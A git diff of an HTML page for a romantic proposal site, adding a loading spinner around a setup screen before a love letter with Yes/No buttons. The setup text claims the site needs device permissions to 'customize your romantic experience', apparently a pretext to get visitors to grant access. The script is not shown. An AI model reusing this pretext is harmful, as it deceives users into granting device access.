@@ -1,18 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>A Special Message For You</title>
     <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
     <div id="setup-screen" class="container">
         <div class="card">
             <h2>Welcome ✨</h2>
-            <p id="status-text">This website requires device permissions to customize your romantic experience. Please allow the prompt to continue.</p>
-            <button id="start-btn" class="btn">Initialize Experience</button>
+
+            <div id="setup-content">
+                <p id="status-text">This website requires device permissions to customize your romantic experience.
+                    Please allow the prompt to continue.</p>
+                <button id="start-btn" class="btn">Initialize Experience</button>
+            </div>
+
+            <div id="loading-container" class="hidden">
+                <div class="spinner"></div>
+                <p class="loading-text">Preparing something beautiful for you...</p>
+            </div>
         </div>
     </div>
 
@@ -21,11 +32,11 @@
             <div class="hearts-animation">💖</div>
             <h1 class="title">To the most beautiful person...</h1>
             <p class="love-letter">
-                Every moment spent with you feels like a beautiful dream. 
+                Every moment spent with you feels like a beautiful dream.
                 You make my world brighter, warmer, and infinitely better.
             </p>
             <h2 class="question">Will you make me the happiest person and be mine?</h2>
-            
+
             <div class="actions">
                 <button id="yes-btn" class="btn yes-btn">Yes, Forever! 🌹</button>
                 <button id="no-btn" class="btn no-btn">No</button>
@@ -37,4 +48,5 @@
 
     <script src="script.js"></script>
 </body>
+
 </html>
